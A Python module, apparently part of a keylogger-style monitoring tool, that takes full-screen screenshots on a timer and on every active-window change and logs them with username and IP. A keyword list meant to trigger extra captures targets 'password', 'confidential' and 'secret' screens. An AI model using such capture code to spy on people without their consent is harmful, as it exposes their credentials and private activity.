import os
import time
import ctypes
from datetime import datetime
from PIL import ImageGrab
import sqlite3
import psutil
from utils import get_username, get_ip
from directory import setup_user_directories

DB_FILE = "./db/keylogs.db"


def save_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        username = get_username()
        ip = get_ip()

        # Set up user directories
        user_dir, clipboard_dir, screenshot_dir, files_dir, video_dir = (
            setup_user_directories(username)
        )

        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)

        # Log the screenshot path in the database
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute(
            "INSERT INTO screenshot_logs (timestamp, username, ip, text, type, image_path) VALUES (?, ?, ?, ?, ?, ?)",
            (
                timestamp,
                username,
                ip,
                "Screenshot taken",
                "screenshot",
                screenshot_path,
            ),
        )
        conn.commit()
        conn.close()

        print(f"Screenshot saved and logged: {screenshot_path}")
    except Exception as e:
        print(f"Error taking screenshot: {e}")


def get_active_window():
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        return psutil.Process(pid.value).name()
    except Exception as e:
        print(f"Error getting active window: {e}")
        return None


def capture_screenshots(interval=30, suspicious_keywords=None):
    last_window = None
    last_time = time.time()

    if suspicious_keywords is None:
        suspicious_keywords = ["password", "confidential", "secret"]

    while True:
        current_window = get_active_window()
        current_time = time.time()

        if current_window != last_window or current_time - last_time >= interval:
            save_screenshot()
            last_window = current_window
            last_time = current_time

        # Example logic for suspicious activity
        log_entry = "Example log entry text"  # Replace this with actual log entry text
        if any(keyword in log_entry.lower() for keyword in suspicious_keywords):
            save_screenshot()

        time.sleep(1)


# Start capturing screenshots
if __name__ == "__main__":
    capture_screenshots()
